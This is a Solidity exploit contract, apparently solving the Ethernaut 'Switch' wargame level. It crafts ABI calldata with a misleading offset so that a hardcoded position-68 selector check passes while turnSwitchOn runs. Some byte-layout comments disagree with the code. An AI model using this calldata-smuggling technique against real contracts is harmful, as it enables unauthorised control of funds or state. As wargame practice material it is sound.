// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SwitchAttack
 * @dev Exploit contract for Ethernaut Level 29 - Switch
 * 
 * VULNERABILITY EXPLANATION:
 * ========================
 * The Switch contract has a vulnerability in its calldata validation:
 * 
 * THE VULNERABLE CODE:
 * modifier onlyOff() {
 *     bytes32[1] memory selector;
 *     assembly {
 *         calldatacopy(selector, 68, 4)  // HARDCODED position 68!
 *     }
 *     require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
 *     _;
 * }
 * 
 * function flipSwitch(bytes memory _data) public onlyOff {
 *     (bool success,) = address(this).call(_data);
 *     require(success, "call failed :(");
 * }
 * 
 * THE PROBLEM:
 * - The modifier checks position 68 for the turnSwitchOff() selector
 * - Position 68 is a HARDCODED offset that assumes standard ABI encoding
 * - We can manipulate the calldata encoding to have:
 *   * turnSwitchOff() selector at position 68 (passes the check)
 *   * turnSwitchOn() selector in the actual _data (flips the switch)
 * 
 * CALLDATA ENCODING BASICS:
 * =========================
 * Normal ABI encoding for flipSwitch(bytes _data):
 * 
 * Position   Content
 * --------   -------
 * 0-3        Function selector (flipSwitch)
 * 4-35       Offset to data location (typically 0x20 = 32)
 * 36-67      Length of data
 * 68+        Actual data bytes
 * 
 * Example with turnSwitchOff():
 * 0x00-0x03: 0x30c13ade (flipSwitch selector)
 * 0x04-0x23: 0x0000...0020 (offset = 32, data starts at position 36)
 * 0x24-0x43: 0x0000...0004 (length = 4 bytes)
 * 0x44-0x47: 0x20606e15 (turnSwitchOff selector)
 * 
 * THE EXPLOIT:
 * ============
 * We craft calldata where:
 * - Position 68 has turnSwitchOff() selector (to satisfy the modifier)
 * - But the actual data parameter points to turnSwitchOn() selector
 * 
 * Crafted calldata structure:
 * 0x00-0x03: 0x30c13ade (flipSwitch selector)
 * 0x04-0x23: 0x0000...0060 (offset = 96, skip past the dummy data!)
 * 0x24-0x43: 0x0000...0000 (dummy value - will be at position 36)
 * 0x44-0x47: 0x20606e15 (turnSwitchOff selector at position 68 - PASSES CHECK!)
 * 0x48-0x5f: 0x0000...0000 (padding)
 * 0x60-0x7f: 0x0000...0004 (length = 4, real data starts here at offset 96)
 * 0x80-0x83: 0x76227e12 (turnSwitchOn selector - ACTUAL DATA!)
 * 
 * This way:
 * - The modifier reads position 68 and finds turnSwitchOff() ✓
 * - But flipSwitch actually calls the data at offset 96, which is turnSwitchOn() ✓
 */

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}

contract SwitchAttack {
    ISwitch public target;
    
    constructor(address _target) {
        target = ISwitch(_target);
    }
    
    /**
     * @dev Helper function to show how the attack would work
     * This demonstrates the vulnerability concept
     * 
     * The actual attack is done via attackDirect() or through the script
     * This function is just for reference/documentation purposes
     */
    function attack() external pure {
        // This function serves as documentation
        // See attackDirect() for the actual implementation
        // Or use the attack script to send crafted calldata directly
        
        // For educational purposes, the malicious calldata structure is:
        // 0x30c13ade (flipSwitch selector)
        // 0x0000...0060 (offset = 96)
        // 0x0000...0000 (dummy padding)
        // 0x20606e15 (turnSwitchOff at position 68 - passes check)
        // 0x0000...0000 (more padding)
        // 0x0000...0004 (length = 4)
        // 0x76227e12 (turnSwitchOn at position 96 - actual data)
    }
    
    /**
     * @dev Direct attack by sending crafted calldata to Switch.flipSwitch
     * This version constructs the malicious calldata in Solidity
     */
    function attackDirect() external {
        // Craft the malicious calldata
        bytes memory craftedCalldata = craftMaliciousCalldata();
        
        // Call the Switch contract with our crafted calldata
        (bool success,) = address(target).call(craftedCalldata);
        require(success, "Attack failed");
    }
    
    /**
     * @dev Construct the malicious calldata
     * Returns calldata that will bypass the onlyOff check but call turnSwitchOn
     */
    function craftMaliciousCalldata() public pure returns (bytes memory) {
        // Function selector for flipSwitch
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        
        // Function selector for turnSwitchOff (will be at position 68)
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        
        // Function selector for turnSwitchOn (the actual data we want to call)
        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));
        
        // Construct the calldata:
        // 0x00-0x03: flipSwitch selector
        // 0x04-0x23: offset to data (0x60 = 96)
        // 0x24-0x43: padding (will contain dummy data)
        // 0x44-0x47: turnSwitchOff selector (at position 68 - passes check!)
        // 0x48-0x5f: more padding
        // 0x60-0x7f: actual data length (4 bytes)
        // 0x80-0x83: turnSwitchOn selector (actual data to call!)
        
        bytes memory calldata_ = abi.encodePacked(
            flipSwitchSelector,                                          // 0x00-0x03 (4 bytes)
            uint256(0x60),                                               // 0x04-0x23 (32 bytes) - offset
            uint256(0x0),                                                // 0x24-0x43 (32 bytes) - dummy
            turnSwitchOffSelector,                                       // 0x44-0x47 (4 bytes) - at pos 68!
            bytes28(0),                                                  // 0x48-0x63 (28 bytes) - padding
            uint256(0x4),                                                // 0x64-0x83 (32 bytes) - length
            turnSwitchOnSelector                                         // 0x84-0x87 (4 bytes) - real data!
        );
        
        return calldata_;
    }
    
    /**
     * @dev Get the current switch state
     */
    function isSwitchOn() external view returns (bool) {
        return target.switchOn();
    }
    
    /**
     * @dev Helper to get function selectors
     */
    function getSelectors() external pure returns (
        bytes4 flipSwitch,
        bytes4 turnOn,
        bytes4 turnOff
    ) {
        flipSwitch = bytes4(keccak256("flipSwitch(bytes)"));
        turnOn = bytes4(keccak256("turnSwitchOn()"));
        turnOff = bytes4(keccak256("turnSwitchOff()"));
    }
}
